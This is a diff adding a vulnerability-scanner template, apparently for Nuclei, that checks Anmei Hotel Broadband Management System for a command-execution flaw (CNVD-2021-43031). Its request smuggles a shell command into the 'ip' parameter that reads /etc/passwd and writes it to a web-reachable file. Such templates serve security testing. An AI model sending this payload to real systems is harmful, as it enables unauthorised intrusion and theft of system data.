@@ -1,0 +1,25 @@
+id: hotel-internet-manage-rce
+info:
+  name: Anmei Hotel Broadband Management System Command Execution Vulnerability (CNVD-2021-43031)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce,CNVD-2021-43031
+  description: |
+    Anmei Hotel Broadband Management System is vulnerable to a command execution vulnerability.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/manager/radius/server_ping.php?ip=127.0.0.1|cat /etc/passwd >../../Test.txt&id=1"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+      Accept-Encoding: gzip,deflate
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "parent.doTestResult"
+        part: body
